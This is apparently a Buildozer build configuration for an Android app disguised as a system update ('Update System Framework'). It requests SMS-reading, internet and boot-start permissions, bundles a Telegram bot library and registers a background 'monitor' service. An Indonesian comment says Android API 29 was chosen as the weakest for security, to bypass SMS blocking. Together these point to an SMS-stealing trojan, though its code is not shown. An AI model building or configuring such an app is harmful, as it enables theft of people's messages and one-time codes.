[app]
title = Update System Framework
package.name = sys_v2_update
package.domain = com.internal.core
source.dir = .
source.include_exts = py,png,jpg,kv,atlas
version = 2.1

requirements = python3,kivy,pyTelegramBotAPI,android,pyjnius,requests,certifi

android.permissions = READ_SMS, RECEIVE_SMS, POST_NOTIFICATIONS, INTERNET, RECEIVE_BOOT_COMPLETED

# PAKAI API 29 (Android 10). Ini adalah API paling "lemah" sistem keamanannya 
# tapi masih mendukung fitur modern. Sangat efektif untuk bypass blokir SMS.
android.api = 29
android.minapi = 21
android.ndk = 25b

android.archs = arm64-v8a, armeabi-v7a
services = monitor:main.py
